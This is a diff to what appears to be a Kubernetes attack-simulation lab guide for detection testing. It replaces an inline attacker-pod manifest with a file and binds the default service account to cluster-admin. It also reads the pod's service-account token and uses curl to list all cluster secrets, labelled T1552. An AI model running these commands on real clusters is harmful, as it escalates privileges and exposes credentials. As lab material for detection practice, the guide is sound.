@@ -201,26 +201,18 @@ You should see:
 
 If attacker pod is missing:
 ```bash
-kubectl apply -f - << 'PODEOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: attacker
-spec:
-  containers:
-  - name: attacker
-    image: ubuntu:latest
-    imagePullPolicy: IfNotPresent
-    command: ["bash", "-c"]
-    args: ["while true; do bash -c 'id && whoami'; sleep 30; done"]
-PODEOF
+kubectl apply -f week4/attacker-pod.yaml
 kubectl wait --for=condition=ready pod/attacker --timeout=120s
-kubectl cp /usr/local/bin/kubectl attacker:/usr/local/bin/kubectl
-kubectl exec attacker -- apt-get update -qq
-kubectl exec attacker -- apt-get install -y -qq curl
 kubectl create clusterrolebinding attacker-secret-reader \
   --clusterrole=cluster-admin --serviceaccount=default:default 2>/dev/null || true
 ```
+The manifest installs `curl` on startup (bash/su/chroot already ship with
+`ubuntu:latest`). All the attack-simulation scripts read secrets/RBAC
+objects via the pod's own mounted service-account token with `curl`
+rather than needing a `kubectl` binary inside the container — copying one
+in via `kubectl cp` from the operator's own machine is fragile (it copies
+whatever `kubectl` binary and architecture exists at that local path,
+which silently breaks the container if it doesn't match).
 
 ### Step 4: Enable audit logging (if cluster restarted fresh)
 ```bash
@@ -276,11 +268,7 @@ kubectl exec attacker -- bash -c "curl -s --max-time 3 http://10.244.0.11 || tru
 sleep 2
 
 # T1552: secret access
-TOKEN=$(kubectl exec attacker -- cat /run/secrets/kubernetes.io/serviceaccount/token)
-kubectl exec attacker -- kubectl get secrets \
-  --server=https://10.96.0.1 \
-  --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-  --token="$TOKEN" || true
+kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets'
 ```
 
 ### Step 9: Watch dashboard
